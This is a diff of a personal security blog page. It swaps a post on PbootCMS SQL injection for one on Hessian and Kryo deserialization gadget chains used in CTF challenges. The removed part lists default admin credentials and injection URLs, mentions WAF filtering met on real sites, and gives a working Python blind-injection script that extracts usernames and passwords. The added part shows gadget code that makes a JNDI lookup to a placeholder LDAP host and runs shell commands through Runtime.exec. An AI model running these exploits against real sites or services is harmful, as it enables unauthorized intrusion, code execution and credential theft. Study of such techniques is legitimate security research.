@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">cms漏洞3 | popko&#39;s Blog</title>
+  <title itemprop="name">popko&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -168,30 +168,6 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
 
-  <div class="pattern-center single-center">
-    <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
-    </div>
-    <header class="pattern-header single-header">
-      <h1 class="entry-title">
-      cms漏洞3</h1>
-      <p class="entry-census">
-        <span>
-          <a href="popko.top">
-            <img src="https://www.popko.top/img/custom/avatar.jpg">
-          </a>
-        </span>
-        <span>
-          <a href="popko.top">popko</a>
-        </span>
-        <span class="bull">
-        ·</span>
-        2022-3-24<span class="bull">
-        ·</span>
-      <span id="busuanzi_value_page_pv"></span>次阅读</p>
-    </header>
-  </div>
-
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
@@ -199,154 +175,246 @@
         <div class="toc"></div>
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
+          <header class="entry-header">
+            <h1 class="entry-title"></h1>
+            <p class="entry-census">&nbsp;·&nbsp;2023-8-8&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+
+            <hr>
+          </header>
+        
         <div class="entry-content">
-          <h1 id="cms漏洞3"><a href="#cms漏洞3" class="headerlink" title="cms漏洞3"></a>cms漏洞3</h1><h1 id="pbootcms"><a href="#pbootcms" class="headerlink" title="pbootcms"></a>pbootcms</h1><p>后台 /admin.php 默认账号密码 admin:123456</p>
-<p>sqlite数据库密码为 md5(md5(“123456”))</p>
-<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>3.0.4</p>
-<p><a target="_blank" rel="noopener" href="http://www.hackdig.com/06/hack-377510.htm">http://www.hackdig.com/06/hack-377510.htm</a></p>
-<h3 id="lt-3-0-5"><a href="#lt-3-0-5" class="headerlink" title="&lt;= 3.0.5"></a>&lt;= 3.0.5</h3><p>PbootCMS/v305/apps/home/model/ParserModel.php 参数拼接(sql sink)</p>
-<h4 id="注入点1"><a href="#注入点1" class="headerlink" title="注入点1"></a>注入点1</h4><p><a target="_blank" rel="noopener" href="http://wiki.peiqi.tech/wiki/cms/PbootCMS/PbootCMS%20domain%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html">http://wiki.peiqi.tech/wiki/cms/PbootCMS/PbootCMS%20domain%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html</a></p>
-<pre><code>http://localhost:60086/PbootCMS/v304/?domain/13%27.html
-
-http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%271%27--.html
-http://127.0.0.1:60086/PbootCMS/v304/?domain/13%27)and%270%27--.html
-</code></pre><h4 id="注入点2-有的网站管理员可能删除了注入点1"><a href="#注入点2-有的网站管理员可能删除了注入点1" class="headerlink" title="注入点2//有的网站管理员可能删除了注入点1"></a>注入点2//有的网站管理员可能删除了注入点1</h4><pre><code>/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html
-</code></pre><p>遇到问题</p>
-<pre><code>http://localhost:60086/PbootCMS/v305/?about_3%27)and(1)--.html
-</code></pre><blockquote>
-<p>200</p>
-</blockquote>
-<pre><code>http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(&#39;qwe&#39;))--.html
-</code></pre><blockquote>
-<p>执行SQL发生错误！错误：no such table: qwe </p>
-</blockquote>
-<pre><code>http://localhost:60086/PbootCMS/v305/?about_3%27)and(select(username)from(ay_user))--.html
-</code></pre><blockquote>
-<p>执行SQL发生错误！错误：near “3”: syntax error</p>
-</blockquote>
-<p>调试后发现是<code>_</code>的问题</p>
-<h5 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h5><p>入口</p>
-<p>PbootCMS/v305/apps/home/controller/IndexController.php</p>
-<pre><code class="php">        &#125; elseif ($url_rule_type == 3 &amp;&amp; isset($_SERVER[&quot;QUERY_STRING&quot;]) &amp;&amp; $qs = $_SERVER[&quot;QUERY_STRING&quot;]) &#123; // 采用简短传参模式
-            parse_str($qs, $output);
-            unset($output[&#39;page&#39;]); // 去除分页
-            if ($output &amp;&amp; ! current($output)) &#123; // 第一个路径参数不能有值，否则非标准路径参数
-                $path = key($output); // 第一个参数为路径信息，注意PHP数组会自动将key点符号转换下划线
-                $path = trim($path, &#39;/&#39;); // 去除两端斜杠
-                $url_rule_suffix = substr($this-&gt;config(&#39;url_rule_suffix&#39;), 1);
-                if (preg_match(&#39;/_&#39; . $url_rule_suffix . &#39;$/&#39;, $path) &amp;&amp; (! ! $pos = strripos($path, &#39;_&#39; . $url_rule_suffix))) &#123;
-                    $path = substr($path, 0, $pos); // 去扩展
-                &#125;
-                $path = explode(&#39;/&#39;, $path);
-            &#125;
-        &#125;...
-        if (isset($path) &amp;&amp; is_array($path)) &#123;
-            // 地址分隔符
-            $url_break_char = $this-&gt;config(&#39;url_break_char&#39;) ?: &#39;_&#39;;
-
-            // 判断第一个参数中组合信息
-            if (strpos($path[0], $url_break_char)) &#123; 
-                //$path[0]为about_3&#39;)and(select(username)from(ay_user))--
-                //$url_break_char为_
-                $param = explode($url_break_char, $path[0]);
+          <h1 id="hession-onlyjdk-2-kryo-onlyjdk"><a href="#hession-onlyjdk-2-kryo-onlyjdk" class="headerlink" title="hession onlyjdk 2 kryo onlyjdk"></a>hession onlyjdk 2 kryo onlyjdk</h1><p><a target="_blank" rel="noopener" href="https://github.com/pipimi110/my4unser/blob/master/src/main/java/org/example/my4unser/kryo/OnlyJdk.java">https://github.com/pipimi110/my4unser/blob/master/src/main/java/org/example/my4unser/kryo/OnlyJdk.java</a></p>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul>
+<li>虎符ezchain</li>
+</ul>
+<p>rome依赖下的hession反序列化</p>
+<ul>
+<li>mrctf springcoffee</li>
+</ul>
+<p>rome依赖下的kryo反序列化</p>
+<h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>两个gadget是相同的</p>
+<p>hession和kryo反序列化都是以HashMap.put为起点，</p>
+<p>hashmap.put-&gt;key.hashcode()</p>
+<p>(rometools)EqualsBean.hashCode()-&gt;EqualsBean.obj.toString()</p>
+<p>(rometools)ToStringBean.toString-&gt;无参getter遍历</p>
+<p>无参getter-&gt;jndi注入/TemplatesImpl.getOutputProperties代码执行/SignedObject.getObject二重反序列化</p>
+<p>不出网时，优先用TemplatesImpl.getOutputProperties，因为二重也还是需要反序列化链（sink可能还是TemplatesImpl）</p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808151521436.png" alt="image-20230808151521436"></p>
+<pre><code>new ToStringBean(Templates.class, getTemplates(templateName))//指定类为接口类Templates.class，可以保证有且只触发getOutputProperties，防止报错
+</code></pre><p>TemplatesImpl有个transient属性</p>
+<pre><code>private transient TransformerFactoryImpl _tfactory = null;
+</code></pre><p>java原生反序列化会在readObject中设置</p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808152422521.png" alt="image-20230808152422521"></p>
+<p>但是hessian反序列化触发getOutputProperties()过程中，该transient属性不会被设置，导致报错无法加载字节码</p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808152244464.png" alt="image-20230808152244464"></p>
+<p>因此需要二重反序列化，从hessian-&gt;原生反序列化来设置_tfactory</p>
+<h2 id="0ctf-hession-onlyjdk"><a href="#0ctf-hession-onlyjdk" class="headerlink" title="0ctf hession onlyjdk"></a>0ctf hession onlyjdk</h2><p>实际上，hession可以不⽤实现java原生反序列必须的Serializable接口</p>
+<pre><code class="java">    public static byte[] hessianSer(Object argobj) throws Exception &#123;
+        ByteArrayOutputStream os = new ByteArrayOutputStream();
+        Hessian2Output output = new Hessian2Output(os);
+        //Serialized class javax.naming.ldap.Rdn$RdnEntry must implement java.io.Serializable
+// 添加设置，允许未实现java.io.Serializable
+        output.getSerializerFactory().setAllowNonSerializable(true);
+        output.writeObject(argobj);
+        output.getBytesOutputStream().flush();
+        output.completeMessage();
+        output.close();
+        byte[] bytes = os.toByteArray();
+        return bytes;
+    &#125;
+</code></pre>
+<pre><code>createValue:67, SwingLazyValue (sun.swing)
+getFromHashtable:216, UIDefaults (javax.swing)
+get:161, UIDefaults (javax.swing)
+toString:253, MimeTypeParameterList (javax.activation)
+equals:381, AudioFileFormat$Type (javax.sound.sampled)
+compareTo:441, Rdn$RdnEntry (javax.naming.ldap)
+compareTo:420, Rdn$RdnEntry (javax.naming.ldap)
+put:568, TreeMap (java.util)
+add:255, TreeSet (java.util)
+readLengthList:93, CollectionDeserializer (com.caucho.hessian.io)
+readObject:2092, Hessian2Input (com.caucho.hessian.io)
+hessianUnser:26, HessianUtil (org.example.my4unser.utils)
+main:64, OnlyJdk (org.example.my4unser.hessian)
+</code></pre><p>工具?</p>
+<h3 id="createValue任意静态方法调用"><a href="#createValue任意静态方法调用" class="headerlink" title="createValue任意静态方法调用"></a>createValue任意静态方法调用</h3><pre><code>    public Object createValue(UIDefaults var1) &#123;
+        try &#123;
+            ReflectUtil.checkPackageAccess(this.className);
+            Class var2 = Class.forName(this.className, true, (ClassLoader)null);
+            Class[] var3;
+            if (this.methodName != null) &#123;
+                var3 = this.getClassArray(this.args);
+                Method var6 = var2.getMethod(this.methodName, var3);
+                this.makeAccessible(var6);
+                return var6.invoke(var2, this.args);
             &#125; else &#123;
-                $param[] = $path[0];
-            &#125;
-</code></pre>
-<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220324225155741.png" alt="image-20220324225155741"></p>
-<p>根据</p>
-<pre><code class="php">                $path = explode(&#39;/&#39;, $path);//构造一个path[0]绕过
-</code></pre>
-<p>改成下面绕过</p>
-<pre><code>/PbootCMS/v304/?about_/3%27)and(select(username)from(ay_user))--.html
-</code></pre><p>但是都变成404了，发现执行了不同的sql，</p>
-<pre><code class="php">                        if (count($path) &gt; 1) &#123;//注入点2//为了绕过_ count($path)&gt;1了
-                            define(&#39;CMS_PAGE&#39;, false); // 使用普通分页处理模型
-                            if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123;
-                                if ($data-&gt;acode != get_lg() &amp;&amp; Config::get(&#39;lgautosw&#39;) !== &#39;0&#39;) &#123;
-                                    cookie(&#39;lg&#39;, $data-&gt;acode); // 调用内容语言与当前语言不一致时，自动切换语言
-                                &#125;
-                                $this-&gt;getContent($data);
-                            &#125; else &#123;
-                                _404(&#39;您访问的内容不存在，请核对后重试！&#39;);
-                            &#125;
-                        &#125; else &#123;//注入点1
-</code></pre>
-<p>尝试手动修改id测试满足一下条件</p>
-<pre><code>if (! ! ($data = $this-&gt;model-&gt;getContent($path[1])) &amp;&amp; ($data-&gt;scode == $scode || $data-&gt;sortfilename == $scode) &amp;&amp; $data-&gt;type == 2) &#123;
-</code></pre><p>默认数据改成下面可以用</p>
-<pre><code>http://localhost:60086/PbootCMS/v305/?about_4/5%27)and(1)--.html
-</code></pre><blockquote>
-<p>网站管理员修改后的可以爆破一下，满足条件返回200</p>
-<p><code>GET /?about_§4§/§5§%27)and(1)--.html HTTP/1.1</code></p>
+</code></pre><p><a target="_blank" rel="noopener" href="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/">https://yzddmr6.com/posts/swinglazyvalue-in-webshell/</a></p>
+<h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><pre><code>    Object o = new sun.swing.SwingLazyValue(&quot;javax.naming.InitialContext&quot;, &quot;doLookup&quot;, new Object[]&#123;&quot;ldap://xxxx&quot;&#125;);
+    UIDefaults uiDefaults = new UIDefaults();
+    uiDefaults.put(&quot;aaa&quot;, o);
+    uiDefaults.get(&quot;aaa&quot;);
+</code></pre><h4 id="套娃反射执行命令"><a href="#套娃反射执行命令" class="headerlink" title="套娃反射执行命令"></a>套娃反射执行命令</h4><pre><code>    Method invoke = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);
+    Method exec = Runtime.class.getMethod(&quot;exec&quot;, String[].class);
+    String[] command = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;open /&quot;&#125;;
+    SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;, &quot;invoke&quot;, new Object[]&#123;invoke, new Object(), new Object[]&#123;exec, Runtime.getRuntime(), new Object[]&#123;command&#125;&#125;&#125;);
+    UIDefaults u1 = new UIDefaults();
+    u1.put(&quot;key&quot;, swingLazyValue);
+    u1.get(&quot;key&quot;);
+</code></pre><h2 id="kryo-onlyjdk"><a href="#kryo-onlyjdk" class="headerlink" title="kryo onlyjdk"></a>kryo onlyjdk</h2><blockquote>
+<p>Class is not registered: java.util.HashMap//需要在白名单内，默认白名单为空</p>
 </blockquote>
-<p>某站扫了一下</p>
-<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220324223724439.png" alt="image-20220324223724439"></p>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><blockquote>
-<p>pbootcms 过滤空格</p>
-</blockquote>
+<pre><code class="java">        kryo.setRegistrationRequired(false);//关闭白名单校验
+</code></pre>
 <blockquote>
-<p>实测有的站有waf</p>
-<p>#过滤from(xxx)</p>
-<p>#过滤from<code>xxx</code></p>
-<p>#过滤substr</p>
+<p>com.esotericsoftware.kryo.KryoException: Class cannot be created (missing no-arg constructor): sun.swing.SwingLazyValue<br>Serialization trace:<br>parameters (javax.activation.MimeTypeParameterList)<br>value (javax.naming.ldap.Rdn$RdnEntry)<br>    at com.esotericsoftware.kryo.util.<strong>DefaultInstantiatorStrategy</strong>.newInstantiatorOf(DefaultInstantiatorStrategy.java:111) </p>
+<p>//kryo默认使用<strong>DefaultInstantiatorStrategy策略</strong>，反序列化需要<strong>无参构造函数</strong>，kryo通过反射调用该构造函数来实例化对象。</p>
 </blockquote>
-<pre><code class="python">import re
-from threading import Thread
-import requests
-import urllib3
-import string
-urllib3.util.url.FRAGMENT_CHARS |= &#123;&quot;|&quot;, &quot;%&quot;&#125;
-
-url = &quot;&quot;
-bool_flag = 200
-proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;
-
-def getres(exp):
-    burp0_url = url+exp+&quot;.html&quot;
-    # r = requests.get(burp0_url, proxies=proxies)
-    r = requests.get(burp0_url)
-    e = &quot;syntax error&quot;
-    if e in r.text:
-        print(r.text)
-        exit(e)
-    return r.status_code
-
-def makexp(c,flag):
-    exp = &quot;&#39;)and((&#123;content&#125;)like&#39;&#123;flag&#125;%&#39;)--&quot;.format(content=c,flag=flag)
-    return exp
-
-
-def run(len1, chars, c, flag):
-    for l in range(len1):
-        for x in chars:
-            tmp = flag+x
-            exp = makexp(c, tmp)
-            print(&quot;[-]test: &quot;+x)
-            # print(exp)
-            # print(getres(exp))
-            if getres(exp) == 200:
-                flag = tmp
-                break
-            # exit()
-        print(&quot;[+]flag: &quot;+flag)
-        if flag != tmp:
-            exit(&quot;[-]not found|over&quot;)
-
-
-c = &quot;sqlite_version()&quot; #过滤sqlite_version()
-#过滤空格
-#过滤from(xxx)
-#过滤from`xxx`
-#过滤substr
-c = &quot;select(group_concat(password))from&#39;ay_user&#39;&quot;
-c = &quot;select(group_concat(username))from&#39;ay_user&#39;&quot;
-chars = &quot;,&quot;+string.ascii_letters+string.digits+&quot;_&quot;
-len1 = 20
-flag = &quot;&quot;
-run(len1, chars, c, flag)
-
+<p>在springcoffee题目中，可以通过设置策略为StdInstantiatorStrategy</p>
+<p>该策略通过jvm api创建对象，这会<strong>创建一个完全空的对象</strong>（即不执行任何代码中的初始化工作）</p>
+<pre><code class="java">kryo.setInstantiatorStrategy(new StdInstantiatorStrategy());
 </code></pre>
+<h3 id="table-null报错"><a href="#table-null报错" class="headerlink" title="table null报错"></a>table null报错</h3><p>使用StdInstantiatorStrategy策略，并改成onlyjdk exp反序列化报错</p>
+<blockquote>
+<p>Caused by: java.lang.NullPointerException<br>    at java.util.Hashtable.put(Hashtable.java:466)<br>    at javax.swing.UIDefaults.put(UIDefaults.java:346)</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808170039860.png" alt="image-20230808170039860"></p>
+<p>原因：StdInstantiatorStrategy策略通过jvm api会<strong>创建一个完全空的对象</strong></p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808165745920.png" alt="image-20230808165745920"></p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230806221023930.png" alt="image-20230806221023930"></p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230806220657380.png" alt="image-20230806220657380"></p>
+<h3 id="UIDefaults构造函数设置table"><a href="#UIDefaults构造函数设置table" class="headerlink" title="UIDefaults构造函数设置table"></a>UIDefaults构造函数设置table</h3><p>发现在Hashtable构造函数中有对table的设置</p>
+<pre><code class="java">    public Hashtable(int initialCapacity, float loadFactor) &#123;
+        ...
+        table = new Entry&lt;?,?&gt;[initialCapacity];
+</code></pre>
+<p>UIDefaults有public无参构造函数，可以调用Hashtable构造函数给table赋值</p>
+<pre><code class="java">    public UIDefaults() &#123;
+        this(700, .75f);
+    &#125;
+    public UIDefaults(int initialCapacity, float loadFactor) &#123;
+        super(initialCapacity, loadFactor);//Hashtable
+</code></pre>
+<p>联系前面策略的设置，猜测是策略的问题</p>
+<pre><code>kryo.setInstantiatorStrategy(new DefaultInstantiatorStrategy(new StdInstantiatorStrategy()));
+</code></pre><pre><code class="java">    public DefaultInstantiatorStrategy(InstantiatorStrategy fallbackStrategy) &#123;
+        this.fallbackStrategy = fallbackStrategy;
+    &#125;
+
+
+    public ObjectInstantiator newInstantiatorOf(final Class type) &#123;
+        if (!Util.isAndroid) &#123;
+            Class enclosingType = type.getEnclosingClass();
+            boolean isNonStaticMemberClass = enclosingType != null &amp;&amp; type.isMemberClass() &amp;&amp; !Modifier.isStatic(type.getModifiers());
+            if (!isNonStaticMemberClass) &#123;
+                try &#123;
+                    final ConstructorAccess access = ConstructorAccess.get(type);//需要无参且public
+                    return new ObjectInstantiator() &#123;
+                        public Object newInstance() &#123;
+                            try &#123;
+                                return access.newInstance();
+                            &#125; catch (Exception var2) &#123;
+                                throw new KryoException(&quot;Error constructing instance of class: &quot; + Util.className(type), var2);
+                            &#125;
+                        &#125;
+                    &#125;;
+                &#125; catch (Exception var7) &#123;
+                &#125;
+            &#125;
+        &#125;
+
+        try &#123;
+            final Constructor ctor;
+            try &#123;
+                ctor = type.getConstructor((Class[])null);//public修饰的构造函数
+            &#125; catch (Exception var5) &#123;
+                ctor = type.getDeclaredConstructor((Class[])null);//所有访问权限的构造函数
+                ctor.setAccessible(true);
+            &#125;
+
+            return new ObjectInstantiator() &#123;
+                public Object newInstance() &#123;
+                    try &#123;
+                        return ctor.newInstance();
+                    &#125; catch (Exception var2) &#123;
+                        throw new KryoException(&quot;Error constructing instance of class: &quot; + Util.className(type), var2);
+                    &#125;
+                &#125;
+            &#125;;
+        &#125; catch (Exception var6) &#123;
+            if (this.fallbackStrategy == null) &#123;
+                ...
+            &#125; else &#123;//没有无参构造函数,进入fallbackStrategy
+                return this.fallbackStrategy.newInstantiatorOf(type);
+            &#125;
+        &#125;
+    &#125;
+</code></pre>
+<blockquote>
+<p>即<strong>先尝试通过无参构造函数实例化对象，如果类中没有无参构造函数，则会使用StdInstantiatorStrategy策略构造一个空属性对象</strong>。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/liuxiangke0210/article/details/78377677">https://blog.csdn.net/liuxiangke0210/article/details/78377677</a></p>
+</blockquote>
+<h3 id="hessian不会报错的原因"><a href="#hessian不会报错的原因" class="headerlink" title="hessian不会报错的原因"></a>hessian不会报错的原因</h3><pre><code>&lt;init&gt;:95, UIDefaults (javax.swing)
+newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
+newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
+newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
+newInstance:423, Constructor (java.lang.reflect)
+readMap:105, MapDeserializer (com.caucho.hessian.io)//
+readObject:1707, Hessian2Input (com.caucho.hessian.io)
+deserialize:419, UnsafeDeserializer$ObjectFieldDeserializer (com.caucho.hessian.io)
+readObject:239, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:150, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readObject:1677, Hessian2Input (com.caucho.hessian.io)
+deserialize:419, UnsafeDeserializer$ObjectFieldDeserializer (com.caucho.hessian.io)
+readObject:239, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:150, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readLengthList:93, CollectionDeserializer (com.caucho.hessian.io)
+readObject:2092, Hessian2Input (com.caucho.hessian.io)
+hessianUnser:26, HessianUtil (org.example.my4unser.utils)
+main:64, OnlyJdk (org.example.my4unser.hessian)
+</code></pre><p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808172948302.png" alt="image-20230808172948302"></p>
+<pre><code class="java">    public Object readMap(AbstractHessianInput in) throws IOException &#123;
+        Object map;
+        if (this._type == null) &#123;
+            map = new HashMap();
+        &#125; else if (this._type.equals(Map.class)) &#123;
+            map = new HashMap();
+        &#125; else if (this._type.equals(SortedMap.class)) &#123;
+            map = new TreeMap();
+        &#125; else &#123;
+            try &#123;
+                map = (Map)this._ctor.newInstance();//无参构造函数
+</code></pre>
+<pre><code>instantiate:306, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:148, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readMap:114, MapDeserializer (com.caucho.hessian.io)
+readObject:1707, Hessian2Input (com.caucho.hessian.io)
+deserialize:419, UnsafeDeserializer$ObjectFieldDeserializer (com.caucho.hessian.io)
+readObject:239, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:150, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readObject:1677, Hessian2Input (com.caucho.hessian.io)
+deserialize:419, UnsafeDeserializer$ObjectFieldDeserializer (com.caucho.hessian.io)
+readObject:239, UnsafeDeserializer (com.caucho.hessian.io)
+readObject:150, UnsafeDeserializer (com.caucho.hessian.io)
+readObjectInstance:2219, Hessian2Input (com.caucho.hessian.io)
+readObject:2140, Hessian2Input (com.caucho.hessian.io)
+readObject:2124, Hessian2Input (com.caucho.hessian.io)
+readLengthList:93, CollectionDeserializer (com.caucho.hessian.io)
+readObject:2092, Hessian2Input (com.caucho.hessian.io)
+hessianUnser:26, HessianUtil (org.example.my4unser.utils)
+main:64, OnlyJdk (org.example.my4unser.hessian)
+</code></pre><p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20230808173512224.png" alt="image-20230808173512224"></p>
+<p>通过unsafe实例化，只会为我们的类分配内存，不会调用构造函数，相当于StdInstantiatorStrategy策略</p>
 
         </div>
         <!-- .entry-content -->
@@ -375,28 +443,11 @@ run(len1, chars, c, flag)
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2022/04/01/Hessian2/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                Hessian2反序列化</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2022/03/21/dubbo%E6%BC%8F%E6%B4%9E/" rel="next">
+            <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/" rel="next">
               <div class="background">
                 <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
               </div>
@@ -404,7 +455,7 @@ run(len1, chars, c, flag)
               Next Post</span>
               <div class="info">
                 <h3>
-                dubbo反序列化漏洞分析</h3>
+                waf绕过</h3>
                 <hr>
               </div>
             </a>
@@ -428,16 +479,16 @@ run(len1, chars, c, flag)
 
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="popko.top" class="profile gravatar"><img src="https://www.popko.top/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
+          <a href="" class="profile gravatar"><img src="" itemprop="image" alt="" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
-            <a href="popko.top" itemprop="url" rel="author">popko</a>
+            <a href="" itemprop="url" rel="author"></a>
             </h3>
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i>otaku</p>
+        <p><i class="iconfont icon-write"></i></p>
       </section>
     </main><!-- #main -->
   </div><!-- #primary -->
